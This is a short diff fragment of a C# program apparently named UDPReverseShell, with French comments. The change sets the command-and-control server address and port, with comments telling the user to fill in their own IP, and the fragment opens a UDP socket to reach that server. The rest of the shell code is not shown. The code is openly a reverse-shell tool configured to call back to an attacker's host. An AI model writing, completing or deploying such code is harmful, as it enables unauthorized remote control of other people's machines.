@@ -10,8 +10,8 @@ namespace UDPReverseShell
         static void Main(string[] args)
         {
             // Adresse IP et port du serveur de commande et de contrôle
-            string host = "10.0.0.1";
-            int port = 8080;
+            string host = "192.168.0.1"; //Mettre votre IP
+            int port = 8080; //Mettre votre port
 
             // Créer une nouvelle socket UDP pour se connecter au serveur
             Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
